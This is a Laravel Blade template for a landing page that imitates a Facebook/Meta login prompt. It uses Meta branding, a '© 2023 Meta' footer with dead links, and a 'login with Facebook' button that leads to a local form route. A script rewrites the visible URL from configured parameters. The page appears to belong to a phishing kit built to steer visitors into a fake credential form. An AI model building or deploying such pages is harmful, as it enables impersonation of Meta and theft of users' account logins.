@push('icons')
    <link rel="apple-touch-icon" href="{{$settings['favicon_icon']}}" sizes="180x180">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="32x32">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
    <link rel="mask-icon" href="{{$settings['favicon_icon']}}">
    <link rel="icon" href="{{$settings['favicon_icon']}}">
    <title>@lang('common.title_page_welcome')</title>
@endpush

@push('styles')
    <link type="text/css" href="{{asset('/css/fb.css')}}" rel="stylesheet">
@endpush

<div class="facebook wrapper">
    <div class="wrapper-content">
        <div class="box-login">
            <div class="box-login-dialog">
                <div class="box-login-content">
                    <div class="box-login-wrapper">
                        <div class="box-login-item">
                            <div class="box-login-line-top"></div>
                            <div class="box-login-image">
                                <div class="image">
                                    <div class="image-content">
                                        <i alt="" data-visualcompletion="css-img"
                                           class="img image-title"></i></div>
                                </div>
                                <div class="atl">
                                    <span class="alt-content">@lang('welcome.login_to_access')</span>
                                </div>
                            </div>
                            <div class="button-login">
                                <div class="button-login-dialog">
                                    <div class="button-login-content">
                                        <a href="{{route('form')}}"
                                           class="button-redirect-to-login" role="none">
                                            <div aria-busy="false"
                                                 class="button-redirect-content"
                                                 role="button" tabindex="0">
                                                <span class="button-redirect-text">
                                                    <div class="button-redirect-text-content">
                                                        <div class="button-redirect-text-item">
                                                            <div class="button-text-icon" role="presentation">
                                                                <div class="button-text-icon-content">
                                                                </div>
                                                            </div>
                                                            <div
                                                                class="button-text-main">@lang('welcome.login_with_facebook')</div>
                                                        </div>
                                                    </div>
                                                </span>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                                <div class="button-login-margin"></div>
                            </div>
                            <div class="box-login-line-bottom"></div>
                        </div>
                    </div>
                    <div class="hide-box-top"></div>
                    <div class="hide-box-bottom"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="footer-item">
            <a class="footer-item-link" href="javascript:;">
                <div aria-level="4" class="footer-item-link-content"
                     role="heading">Developer
                </div>
            </a>
        </div>
        <div class="footer-item">
            <a class="footer-item-link" href="javascript:;">
                <div aria-level="4" class="footer-item-link-content"
                     role="heading">Privacy
                </div>
            </a>
        </div>
        <div class="footer-item">
            <a class="footer-item-link" href="javascript:;">
                <div aria-level="4" class="footer-item-link-content"
                     role="heading">Terms
                </div>
            </a>
        </div>
        <div class="footer-item">
            <a class="footer-item-link" href="javascript:;">
                <div aria-level="4" class="footer-item-link-content"
                     role="heading">Cookies
                </div>
            </a>
        </div>
        <div class="footer-item">
            <a class="footer-item-link" href="javascript:;">
                <div aria-level="4" class="footer-item-link-content"
                     role="heading">Help
                </div>
            </a></div>
        <div class="footer-item">
            <div aria-level="4" class="footer-item-copyright"
                 role="heading">© 2023 Meta
            </div>
        </div>
    </div>
</div>

@push('scripts')
    <script type="text/javascript">
        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_welcome_page')) !!}';
        const parseQueryParams = JSON.parse(queryParams);

        function replaceQueryParam(param, value, search) {
            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
            let query = search.replace(regex, "$1").replace(/&$/, '');

            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
        }

        if (parseQueryParams.length > 0) {
            for (const query of parseQueryParams) {
                const currentQuery = window.location.search
                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
                window.history.pushState(null, null, newUrl)
            }
        }
    </script>
@endpush
